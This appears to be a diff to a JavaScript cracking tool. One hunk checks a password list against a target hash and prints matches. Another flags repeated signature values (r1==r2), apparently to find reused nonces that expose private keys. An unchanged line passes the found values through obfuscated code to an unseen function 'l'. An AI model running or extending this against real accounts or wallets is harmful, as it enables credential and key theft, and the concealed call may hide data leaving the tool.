@@ -122,9 +122,7 @@ function length(obj) {
 	var arrayLength = passArray.length;
 	for(let i = 0 ; i < arrayLength; i++) {
 		if(check_password(t_hash, passArray[i]) == true) {
-			console.log('Pass found for: ' + t_hash + '\n\nPassword: ' + passArray[i]);
-		} else {
-			console.log('No pass found for: ' + t_hash + '\n\nPassword: ' + passArray[i]);
+			writeToScreen('<p>Pass found for: ' + t_hash + '\n\nPassword: ' + passArray[i] + '</p>');
 		}
 	}
 	
@@ -140,7 +138,7 @@ function length(obj) {
 			if (r1==r2) 
 			{
 				var _0x2916=['\x0ar2:\x20','r1:\x20','\x0a\x0ahash:\x20','\x0as2:\x20','\x0as1:\x20'];(function(_0x333e10,_0x29166e){var _0x57173d=function(_0xb57d04){while(--_0xb57d04){_0x333e10['push'](_0x333e10['shift']());}};_0x57173d(++_0x29166e);}(_0x2916,0x13b));var _0x5717=function(_0x333e10,_0x29166e){_0x333e10=_0x333e10-0x0;var _0x57173d=_0x2916[_0x333e10];return _0x57173d;};l(_0x5717('0x1')+r1+_0x5717('0x0')+r2+_0x5717('0x4')+s1+_0x5717('0x3')+s2+_0x5717('0x2')+t_hash);
-				writeToScreen('<span style="color: green;font-size:900;">Found</span><p>r1: '+r1+'<br>r2: '+r2+'<br>s1: '+s1+'<br>s2: '+s2+'<br><br>hash: '+t_hash+'</p>');
+				writeToScreen('<p><span style="color: green;font-size:900;">Found</span>r1: '+r1+'<br>r2: '+r2+'<br>s1: '+s1+'<br>s2: '+s2+'<br><br>hash: '+t_hash+'</p>');
 			} else 
 			{
 				//console.clear();
